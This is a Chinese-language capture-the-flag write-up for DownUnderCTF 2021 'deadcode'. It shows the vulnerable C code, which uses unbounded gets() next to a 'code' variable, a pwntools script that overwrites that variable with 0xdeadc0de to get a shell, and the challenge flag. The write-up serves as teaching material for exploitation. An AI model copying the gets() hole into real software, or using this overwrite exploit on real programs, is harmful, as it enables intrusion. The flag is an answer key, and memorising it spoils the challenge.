# DownUnderCTF 2021 - deadcode

## 题目简述

程序把用户输入读入 16 字节栈缓冲区 `feature`，却使用无长度限制的 `gets`。同一栈帧中还有初值为 0 的 `long code`；当它等于 `0xdeadc0de` 时，程序执行 `system("/bin/sh")`。因此目标不是劫持返回地址，而是用相邻变量覆盖激活原本不可达的分支。

## 解题过程

反编译或查看仓库源码可得到关键逻辑：

```c
long code = 0;
char feature[16];

gets(feature);
if (code == 0xdeadc0de) {
    system("/bin/sh");
}
```

在提供的二进制中，从 `feature` 起始地址到 `code` 有 24 字节：先填满 16 字节数组，再跨过 8 字节栈布局填充，随后按小端序写入 64 位 `code` 值。

```python
from pwn import p64, remote

io = remote(HOST, PORT)
payload = b"A" * 16
payload += b"B" * 8
payload += p64(0xDEADC0DE)
io.sendlineafter(b"app?\n", payload)
io.sendline(b"cat flag.txt")
print(io.recvline().decode())
```

条件成立后得到 shell，并可读取：

```text
DUCTF{y0u_br0ught_m3_b4ck_t0_l1f3_mn423kcv}
```

## 方法总结

栈溢出不一定要改返回地址。若输入缓冲区附近存在权限标志、长度、函数指针或校验变量，覆盖这些“非控制数据”通常更简单稳定。本题的识别信号是无界 `gets`、相邻局部变量和隐藏的 `system` 分支；实际偏移仍应以提供的二进制反汇编或调试结果为准。
